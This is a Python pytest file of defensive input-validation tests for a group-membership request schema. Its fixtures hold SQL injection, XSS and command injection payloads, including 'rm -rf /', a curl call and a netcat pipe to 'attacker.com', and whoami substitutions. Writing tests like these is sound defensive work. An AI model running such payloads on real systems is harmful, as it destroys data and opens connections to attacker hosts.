"""Security validation tests for groups module.

These tests validate security measures and input validation to ensure
the application is protected against common attack vectors.
"""

import pytest
from pydantic import ValidationError
from modules.groups.schemas import AddMemberRequest


class TestInputValidation:
    """Test input validation security measures."""

    def test_email_validation_rejects_invalid_emails(self):
        """Invalid emails should be rejected."""
        invalid_emails = [
            "not_an_email",
            "user@",
            "@example.com",
            "user@domain",
            "user @example.com",
            "",
            "user+alias@",
        ]

        for invalid_email in invalid_emails:
            with pytest.raises(ValidationError):
                AddMemberRequest(
                    provider="google",
                    group_id="group-123",
                    member_email=invalid_email,
                )

    def test_email_validation_accepts_valid_emails(self):
        """Valid emails should be accepted."""
        valid_emails = [
            "user@example.com",
            "first.last@example.co.uk",
            "user+tag@example.com",
            "123@example.com",
        ]

        for valid_email in valid_emails:
            request = AddMemberRequest(
                provider="google",
                group_id="group-123",
                member_email=valid_email,
            )
            assert request.member_email == valid_email

    def test_group_id_validation_rejects_empty_strings(self):
        """Empty group IDs should be rejected."""
        with pytest.raises(ValidationError):
            AddMemberRequest(
                provider="google",
                group_id="",
                member_email="user@example.com",
            )

    def test_group_id_validation_requires_non_empty(self):
        """Group ID is required and cannot be empty."""
        with pytest.raises(ValidationError):
            AddMemberRequest(
                provider="google",
                group_id=None,
                member_email="user@example.com",
            )

    def test_provider_validation_rejects_invalid_providers(self):
        """Invalid provider types should be rejected."""
        invalid_providers = [
            "invalid",
            "GOOGLE",
            "Okta",
            "amazon",
            "",
            None,
        ]

        for invalid_provider in invalid_providers:
            with pytest.raises(ValidationError):
                AddMemberRequest(
                    provider=invalid_provider,
                    group_id="group-123",
                    member_email="user@example.com",
                )

    def test_provider_validation_accepts_valid_providers(self):
        """Valid provider types should be accepted."""
        valid_providers = ["google", "aws", "azure", "okta", "slack"]

        for valid_provider in valid_providers:
            request = AddMemberRequest(
                provider=valid_provider,
                group_id="group-123",
                member_email="user@example.com",
            )
            assert request.provider.value == valid_provider

    def test_justification_max_length_validation(self):
        """Justification exceeding max length should be rejected."""
        long_justification = "a" * 501

        with pytest.raises(ValidationError):
            AddMemberRequest(
                provider="google",
                group_id="group-123",
                member_email="user@example.com",
                justification=long_justification,
            )

    def test_justification_accepts_valid_length(self):
        """Justification within max length should be accepted."""
        valid_justification = "a" * 500

        request = AddMemberRequest(
            provider="google",
            group_id="group-123",
            member_email="user@example.com",
            justification=valid_justification,
        )
        assert request.justification == valid_justification


class TestSQLInjectionPrevention:
    """Test that SQL injection attacks are prevented."""

    def test_group_id_with_sql_injection_payload(self):
        """SQL injection payloads in group_id should be treated as literal strings."""
        sql_injection_payloads = [
            "group-123'; DROP TABLE groups; --",
            "group-123' OR '1'='1",
            'group-123" OR "1"="1',
            'group-123"; DELETE FROM groups; --',
        ]

        for payload in sql_injection_payloads:
            request = AddMemberRequest(
                provider="google",
                group_id=payload,
                member_email="user@example.com",
            )
            # Should be treated as literal value, not executed
            assert request.group_id == payload

    def test_member_email_with_sql_injection_payload(self):
        """SQL injection in email should be caught by email validation."""
        sql_injection_email = "user@example.com'; DROP TABLE users; --"

        with pytest.raises(ValidationError):
            AddMemberRequest(
                provider="google",
                group_id="group-123",
                member_email=sql_injection_email,
            )

    def test_justification_with_sql_injection_payload(self):
        """SQL injection in justification should be treated as literal string."""
        sql_injection_payload = "Testing: '; DELETE FROM audit_log; --"

        request = AddMemberRequest(
            provider="google",
            group_id="group-123",
            member_email="user@example.com",
            justification=sql_injection_payload,
        )
        # Should be treated as literal value
        assert request.justification == sql_injection_payload


class TestXSSPrevention:
    """Test that XSS attacks are prevented."""

    def test_group_id_with_xss_payload(self):
        """XSS payloads in group_id should be treated as literal strings."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg/onload=alert('xss')>",
        ]

        for payload in xss_payloads:
            request = AddMemberRequest(
                provider="google",
                group_id=payload,
                member_email="user@example.com",
            )
            # Should be treated as literal value, not executed
            assert request.group_id == payload

    def test_requestor_email_with_xss_payload(self):
        """XSS in email should be caught by email validation."""
        xss_email = "<script>alert('xss')</script>@example.com"

        with pytest.raises(ValidationError):
            AddMemberRequest(
                provider="google",
                group_id="group-123",
                member_email="user@example.com",
                requestor=xss_email,
            )


class TestCommandInjectionPrevention:
    """Test that command injection attacks are prevented."""

    def test_group_id_with_command_injection_payload(self):
        """Command injection payloads should be treated as literal strings."""
        command_injection_payloads = [
            "group-123; rm -rf /",
            "group-123 && curl http://attacker.com",
            "group-123 | nc attacker.com 4444",
            "group-123`whoami`",
            "group-123$(whoami)",
        ]

        for payload in command_injection_payloads:
            request = AddMemberRequest(
                provider="google",
                group_id=payload,
                member_email="user@example.com",
            )
            # Should be treated as literal value, not executed
            assert request.group_id == payload


class TestTypeValidation:
    """Test that type validation prevents type confusion attacks."""

    def test_provider_type_must_be_string_or_enum(self):
        """Provider must be valid enum value, not arbitrary type."""
        invalid_types = [123, 45.67, True, [], {}]

        for invalid_type in invalid_types:
            with pytest.raises(ValidationError):
                AddMemberRequest(
                    provider=invalid_type,
                    group_id="group-123",
                    member_email="user@example.com",
                )

    def test_group_id_must_be_string(self):
        """Group ID must be a string."""
        invalid_types = [123, 45.67, True, [], {}]

        for invalid_type in invalid_types:
            with pytest.raises(ValidationError):
                AddMemberRequest(
                    provider="google",
                    group_id=invalid_type,
                    member_email="user@example.com",
                )

    def test_member_email_must_be_string_or_emailstr(self):
        """Member email must be a string in email format."""
        invalid_types = [123, 45.67, True, [], {}]

        for invalid_type in invalid_types:
            with pytest.raises(ValidationError):
                AddMemberRequest(
                    provider="google",
                    group_id="group-123",
                    member_email=invalid_type,
                )


class TestSchemaStrictness:
    """Test that schemas enforce strict validation."""

    def test_extra_fields_ignored(self):
        """Extra fields in request should be ignored (not cause errors)."""
        request = AddMemberRequest(
            provider="google",
            group_id="group-123",
            member_email="user@example.com",
            extra_field="should_be_ignored",
            another_field="also_ignored",
        )
        # Should succeed without error
        assert request.group_id == "group-123"

    def test_missing_required_fields_rejected(self):
        """Missing required fields should be rejected."""
        missing_fields_dicts = [
            {"provider": "google", "group_id": "group-123"},  # missing email
            {
                "provider": "google",
                "member_email": "user@example.com",
            },  # missing group_id
            {
                "group_id": "group-123",
                "member_email": "user@example.com",
            },  # missing provider
        ]

        for invalid_dict in missing_fields_dicts:
            with pytest.raises(ValidationError):
                AddMemberRequest(**invalid_dict)

    def test_optional_fields_can_be_omitted(self):
        """Optional fields should not cause errors when omitted."""
        request = AddMemberRequest(
            provider="google",
            group_id="group-123",
            member_email="user@example.com",
        )
        # Optional fields should have default values
        assert request.justification is None
        assert request.requestor is None
        assert request.metadata is None
